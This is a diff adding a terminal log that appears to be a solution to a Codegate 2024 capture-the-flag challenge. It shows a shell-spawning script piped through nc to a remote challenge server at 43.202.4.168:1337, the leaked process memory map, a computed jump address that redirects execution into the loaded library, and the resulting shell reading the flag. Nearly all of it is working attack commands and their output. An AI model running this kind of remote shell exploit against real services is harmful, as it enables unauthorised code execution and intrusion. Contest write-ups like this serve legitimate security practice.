@@ -1,0 +1,24 @@
+$ cat 1
+#!/bin/sh
+exec sh
+
+$ (echo $(wc -c <1); cat 1; echo qqq; cat)|nc 43.202.4.168 1337
+filesize > elf > elfname > 5cbc39a1f000-5cbc39a23000 r--p 00000000 00:2e 528545                     /usr/bin/dash
+5cbc39a23000-5cbc39a38000 r-xp 00004000 00:2e 528545                     /usr/bin/dash
+5cbc39a38000-5cbc39a3d000 r--p 00019000 00:2e 528545                     /usr/bin/dash
+5cbc39a3d000-5cbc39a40000 rw-p 0001d000 00:2e 528545                     /usr/bin/dash
+5cbc39a40000-5cbc39a42000 rw-p 00000000 00:00 0
+7d968e49b000-7d968e49c000 r--p 00000000 00:2e 529158                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7d968e49c000-7d968e4c7000 r-xp 00001000 00:2e 529158                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7d968e4c7000-7d968e4d1000 r--p 0002c000 00:2e 529158                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7d968e4d1000-7d968e4d5000 rw-p 00036000 00:2e 529158                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffe24d64000-7ffe24d85000 rw-p 00000000 00:00 0                          [stack]
+7ffe24dd0000-7ffe24dd4000 r--p 00000000 00:00 0                          [vvar]
+7ffe24dd4000-7ffe24dd6000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
+where you want to jump (hex)? 0x7d968e4ba540
+cat flag
+codegate2024{3e705164ca859aeb99fe77de577242c93d2e0ee9cb4dea5493427e7673faafa70a8568ef19e4e5a4472eed41932b10970ee03d68f885b6aabf2a6989}
+
+>>> hex(0x1f540+0x7d968e49b000)
+'0x7d968e4ba540'
